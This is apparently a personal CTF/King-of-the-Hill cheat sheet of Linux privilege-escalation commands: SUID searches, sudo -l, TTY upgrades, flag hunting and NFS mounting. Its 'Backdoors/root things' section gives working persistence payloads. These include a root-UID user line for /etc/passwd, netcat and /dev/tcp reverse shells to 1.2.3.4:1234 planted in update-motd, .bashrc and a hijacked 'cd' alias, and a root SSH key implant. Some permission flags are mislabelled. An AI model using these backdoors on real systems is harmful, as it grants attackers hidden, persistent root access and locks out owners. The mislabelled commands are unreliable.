find files with suid perms
```bash
find / -perm /4000 2>/dev/null
```
find files with sgid perms
```bash
find / -perm /6000 2>/dev/null
```
find files with world-writabble perms
```bash
find / -perm /2000 2>/dev/null
```
Search  cronjobs
```bash
cat /etc/crontab
```

lists what users can run sudo on what 
```bash
sudo -l
```

find writable passwd
```bash
ls -la /etc/passwd
```


```bash
find / -perm -u=s -type f 2>/dev.null
```

#### Gaining a full tty shell: 
Victim Machine: 
```bash
~$ python3 -c 'import pty; pty.spawn("/bin/sh")' 
export TERM=xterm
Ctrl + z 
```
Attacking Machine:
```bash
stty raw -echo;fg 
```

#### Finding files and permissions 
- Using find Root permissions 
```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -print
```
- to list files that have SUID or SGID bits set
```bash
find / -type f -perm -04000 -ls 2>/dev/null - will list files that have SUID or SGID bits set.
```
- below may require the user's password
```bash
sudo -l
```

- Flags 
```bash
find / -name flag.txt 2>/dev/null 
find / -name user.txt 2>/dev/null 
find / -name .flag 2>/dev/null 
find / -name flag 2>/dev/null 
find / -name root.txt 2>/dev/null 
find / 2>>/dev/null | grep -i "flag"
```

#### GREP
	- Grep all files recursively for a known flag name in the current directory onwards. 
```bash
grep -RoP "FLAG{.*?}" . grep -RoP "THM{.*?}" .
```
#### Backdoors/root things 
Add a user called hacker with password hacker into /etc/passwd that runs as root. 
```bash
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
``` 
Add revshell into motd 
```bash
cd /etc/update-motd.d/;echo -e '#!/bin/sh\rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1234 >/tmp/f' > 20-backdoor && chmod +x 20-backdoor
``` 
ssh for root 
password = *REDACTED*
```bash
mkdir -p /root/.ssh/ && echo 'REDACTED ryan@Kali2020' > /root/.ssh/authorized_keys ssh -i root@IP
``` 
**How to make this?** 
Use ssh-keygen on your own machine.

bashrc This fully stops anyone getting to root. always sends me a shell. 
```bash
cd /root;echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1234 >/tmp/f &' >> .bashrc
``` 
Another example: 
```bash
echo 'bash -i >& /dev/tcp/1.2.3.4/1234 0>&1' >> ~/.bashrc
```
alias to root (only do this on root as it gives errors for others.) 
```bash
alias cd='$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1234 >/tmp/f); cd'
```

Like FTP, NFS is used to transfer files. They are still quite different. While FTP uses a client-server model to communicate, NFS acts as a distributed system. This means that a user can access a share(think of this as a directory) on their own file system. While FTP uses username and password to manage authentication and authorization to files, NFS uses the linux permission system to manage these things. Common misconfigurations include: Publicly accessible shares: some administrators may expose NFS shares to anyone. An attacker could mount the share onto their file system and access files on the share. When the permissions a file are different, an attacker would have to change their user ID/group ID to match the permissions of the file. The first step would be enumerating a system to check if NFS is running. Once NFS is running, we would check to see if any shares are available. This is done using this command showmount -e ip-address This command shows all the shares exported by NFS. KOTH Notes 8 If this command outputs any shares, you can try mount the shares on to your file system mount ip:/file/path /local/file/path Note that this command would require sudo permissions Once it is successfully mounted, you can browse to the location on your file system and try access the files. After completing this, you need to unmount the file system using the command: umount /local/file/path Note that this command would require sudo permissions Windows (In Progress) windows search for files: dir /b/s *.txt Random list of stuff for now.
